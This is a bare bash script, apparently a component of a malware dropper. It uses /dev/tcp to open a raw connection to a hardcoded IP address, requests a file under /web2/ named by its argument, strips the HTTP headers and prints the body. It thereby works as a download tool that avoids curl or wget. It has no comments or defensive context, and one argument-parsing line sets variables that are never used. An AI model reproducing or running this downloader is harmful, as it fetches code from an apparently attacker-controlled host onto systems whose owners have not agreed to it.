#!/bin/bash
read proto server path <<<$(echo ${1//// })
exec 3<>/dev/tcp/42.51.64.146/443
echo -en "GET /web2/$1 HTTP/1.0\r\nHost: 42.51.64.146:443\r\n\r\n" >&3
(while read line; do
[[ "$line" == $'\r' ]] && break
done && cat) <&3
exec 3>&-
